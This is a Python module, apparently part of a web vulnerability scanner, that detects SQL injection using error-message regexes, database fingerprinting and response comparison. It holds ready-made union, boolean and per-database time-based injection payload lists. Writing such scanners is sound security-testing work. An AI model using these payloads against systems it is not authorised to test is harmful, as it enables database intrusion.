import time
import re

DB_HINTS = {
    "mysql": ["you have an error in your sql syntax", "mysql", "mariadb"],
    "postgres": ["postgresql", "pg_query", "pg_exec", "psql"],
    "mssql": ["microsoft sql", "sql server", "mssql", "sqlsrv"],
    "oracle": ["ora-", "oracle"],
    "sqlite": ["sqlite", "sqlite3"]
}

# Error signatures for error-based SQLi detection
ERROR_SIGNATURES = [
    # MySQL
    r"SQL syntax.*?MySQL",
    r"Warning.*?\Wmysqli?_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    # PostgreSQL
    r"PostgreSQL.*?ERROR",
    r"Warning.*?\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError",
    # MSSQL
    r"Driver.*? SQL[\-\_\ ]*Server",
    r"OLE DB.*? SQL Server",
    r"\bSQL Server[^&lt;&quot;]+Driver",
    r"Warning.*?\W(mssql|sqlsrv)_",
    r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
    r"System\.Data\.SqlClient\.",
    # Oracle
    r"\bORA-\d{5}",
    r"Oracle error",
    r"Oracle.*?Driver",
    r"Warning.*?\W(oci|ora)_",
    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*?\Wsqlite_",
    r"Warning.*?\WSQLite3::",
    # Generic
    r"quoted string not properly terminated",
    r"unclosed quotation mark",
    r"syntax error at or near",
]

# Union-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "1 UNION SELECT 1,2,3--",
]

# Boolean-based payloads
BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("') OR ('1'='1", "') OR ('1'='2"),
]

# Time-based payloads per database
TIME_PAYLOADS = {
    "mysql": ["' OR SLEEP(2)--", "1' AND SLEEP(2)--", "'; SELECT SLEEP(2)--"],
    "postgres": ["'; SELECT pg_sleep(2)--", "' OR pg_sleep(2)--"],
    "mssql": ["'; WAITFOR DELAY '0:0:2'--", "' OR WAITFOR DELAY '0:0:2'--"],
    "oracle": ["' OR DBMS_PIPE.RECEIVE_MESSAGE('x',2)='x"],
    "sqlite": ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--"],
}

def fingerprint_db(text):
    """Identify database type from response text."""
    t = text.lower()
    for db, hints in DB_HINTS.items():
        if any(h in t for h in hints):
            return db
    return "unknown"

def detect_error_based(response_text):
    """
    Check for SQL error messages in response.
    Returns (is_vulnerable, matched_signature)
    """
    for pattern in ERROR_SIGNATURES:
        if re.search(pattern, response_text, re.I):
            return True, pattern
    return False, None

def compare_responses(resp_true, resp_false):
    """
    Enhanced comparison for boolean-based detection.
    Checks multiple signals beyond simple length diff.
    """
    # Status code difference
    if resp_true.status_code != resp_false.status_code:
        return True, "status_code_diff"

    len_true = len(resp_true.text)
    len_false = len(resp_false.text)

    # Significant length difference
    if abs(len_true - len_false) > 50:
        return True, "length_diff"

    # Content hash comparison (for dynamic pages)
    # Normalize whitespace and compare
    norm_true = ' '.join(resp_true.text.split())
    norm_false = ' '.join(resp_false.text.split())
    
    if norm_true != norm_false:
        # Calculate similarity ratio
        from difflib import SequenceMatcher
        ratio = SequenceMatcher(None, norm_true, norm_false).ratio()
        if ratio < 0.95:  # Less than 95% similar = significant difference
            return True, f"content_diff_{ratio:.2f}"

    return False, None

def analyze_boolean_pair(resp_true, resp_false):
    """Wrapper for boolean-based analysis."""
    is_diff, reason = compare_responses(resp_true, resp_false)
    return is_diff

def analyze_time(delay_seconds, observed_elapsed, baseline_elapsed=0.0):
    """
    Check if response time indicates time-based SQLi.

    FIX SQ1: Takes an optional baseline to avoid false positives on slow servers.
    A delay is only confirmed if it exceeds (baseline + expected_delay - 0.5).
    """
    # The observed must exceed the baseline by at least delay_seconds - 0.5s (jitter buffer)
    return observed_elapsed >= (baseline_elapsed + delay_seconds - 0.5)

def detect_union_based(response, baseline_response):
    """
    Detect union-based SQLi by comparing responses.
    Returns (is_vulnerable, evidence)
    """
    # Check if response contains additional data rows
    baseline_len = len(baseline_response.text)
    current_len = len(response.text)

    # Union typically adds data
    if current_len > baseline_len * 1.2:  # 20% increase
        return True, "response_size_increase"

    # Check for NULL or number patterns in response
    null_patterns = [r'\bNULL\b', r'\b1,2,3\b', r'\bversion\(\)', r'\bdatabase\(\)']
    for pattern in null_patterns:
        if re.search(pattern, response.text, re.I):
            return True, f"pattern_match:{pattern}"

    return False, None

def get_sqli_payloads(payload_type="all", db_type="mysql"):
    """
    Get SQLi payloads by type.
    """
    payloads = []

    if payload_type in ["all", "boolean"]:
        payloads.extend(BOOLEAN_PAYLOADS)

    if payload_type in ["all", "time"]:
        payloads.extend([(p, None) for p in TIME_PAYLOADS.get(db_type, TIME_PAYLOADS["mysql"])])

    if payload_type in ["all", "union"]:
        payloads.extend([(p, None) for p in UNION_PAYLOADS])

    return payloads

def analyze_sqli_response(response, baseline=None, payload_type="generic"):
    """
    Comprehensive SQLi analysis.
    Returns dict with vulnerability status and evidence.
    """
    result = {
        "vulnerable": False,
        "type": None,
        "evidence": None,
        "db_type": None
    }

    # Error-based detection
    is_error, signature = detect_error_based(response.text)
    if is_error:
        result["vulnerable"] = True
        result["type"] = "error_based"
        result["evidence"] = signature
        result["db_type"] = fingerprint_db(response.text)
        return result

    # Union-based detection (needs baseline)
    if baseline:
        is_union, evidence = detect_union_based(response, baseline)
        if is_union:
            result["vulnerable"] = True
            result["type"] = "union_based"
            result["evidence"] = evidence
            result["db_type"] = fingerprint_db(response.text)
            return result

    return result
